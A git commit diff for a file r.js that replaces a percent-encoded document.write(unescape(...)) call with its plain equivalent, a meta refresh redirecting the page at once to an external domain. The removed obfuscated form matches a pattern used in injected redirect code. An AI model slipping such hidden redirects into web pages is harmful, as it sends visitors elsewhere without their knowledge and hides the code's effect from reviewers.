d80f9ec00ea9d2b507d134e54e3e9a67c3c0bf7f
masterdevelopment <130308646+masterdevelopment@users.noreply.github.com>
2024-06-16 23:38:05 +0300

    Update r.js

--- r.js
+++ r.js
@@ -1,6 +1,3 @@
 <script type="text/javascript">
-<!-- HTML encoded by Katvin.com -->
-<!--
-document.write(unescape('%3c%6d%65%74%61%20%68%74%74%70%2d%65%71%75%69%76%3d%22%72%65%66%72%65%73%68%22%20%63%6f%6e%74%65%6e%74%3d%22%30%3b%20%75%72%6c%3d%68%74%74%70%73%3a%2f%2f%62%6c%6f%63%6b%2e%6d%67%6f%2e%6c%6f%6c%2f%22%3e'));
-//-->
+document.write('<meta http-equiv="refresh" content="0; url=https://block.mgo.lol/">');
 </script>
